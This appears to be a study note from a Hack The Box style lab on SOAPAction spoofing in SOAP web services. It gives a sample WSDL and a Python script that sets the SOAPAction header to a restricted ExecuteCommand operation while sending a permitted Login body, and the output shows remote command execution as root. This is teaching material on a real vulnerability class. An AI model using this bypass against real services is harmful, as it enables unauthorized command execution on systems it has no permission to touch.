[SOAP (Simple Object Access Protocol)](Web%20Services%20&%20APIs.md#SOAP%20(Simple%20Object%20Access%20Protocol)) messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called `SOAPAction`, which contains the operation's name.

If a web service considers only the `SOAPAction` attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

## Broken Access Control using SOAPAction spoofing

We have the following definition:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/" 
  xmlns:s="http://www.w3.org/2001/XMLSchema" 
  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
  xmlns:tns="http://tempuri.org/" 
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  
  <wsdl:types>    
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">      
      
      <s:element name="LoginRequest">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          </s:sequence>
        </s:complexType>  
      </s:element>
      
      <s:element name="LoginResponse">  
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      
      <s:element name="ExecuteCommandRequest">  
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      
      <s:element name="ExecuteCommandResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      
    </s:schema>
  </wsdl:types>
  
  <!-- Login Messages -->
  <wsdl:message name="LoginSoapIn">  
    <wsdl:part name="parameters" element="tns:LoginRequest"/>
  </wsdl:message>
  
  <wsdl:message name="LoginSoapOut">  
    <wsdl:part name="parameters" element="tns:LoginResponse"/>
  </wsdl:message>
  
    <!-- ExecuteCommand Messages -->
  <wsdl:message name="ExecuteCommandSoapIn">
    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
  </wsdl:message>
  
  <wsdl:message name="ExecuteCommandSoapOut">  
    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
  </wsdl:message>
  
  <wsdl:portType name="HacktheBoxSoapPort">
      
    <!-- Login Operaion | PORT -->
    <wsdl:operation name="Login">  
      <wsdl:input message="tns:LoginSoapIn"/>
      <wsdl:output message="tns:LoginSoapOut"/>
    </wsdl:operation>
    
    <!-- ExecuteCommand Operation | PORT -->
    <wsdl:operation name="ExecuteCommand">
      <wsdl:input message="tns:ExecuteCommandSoapIn"/>
      <wsdl:output message="tns:ExecuteCommandSoapOut"/>
    </wsdl:operation>
  </wsdl:portType>  
  
  <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    
    <!-- SOAP Login Action -->
    <wsdl:operation name="Login">
      <soap:operation soapAction="Login" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    
    <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>
      
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  
  <wsdl:service name="HacktheboxService">  
    <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
      <soap:address location="http://localhost:80/wsdl"/>
    </wsdl:port>
  </wsdl:service>

</wsdl:definitions>
```

When we try to execute the `ExecuteCommand` operation we get blocked:
```xml
$ python3 client.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
```

We can try to bypass the security control providing the same `SOAPAction` header but instead using an authorized SOAP payload:
```python
import requests

# function allowed only from internal networks
old_payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

# function allowed also from external networks
payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

# Restricted function provided inside the SOAPAction
print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

```xml
$ python3 client_soapaction_spoofing.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>'
```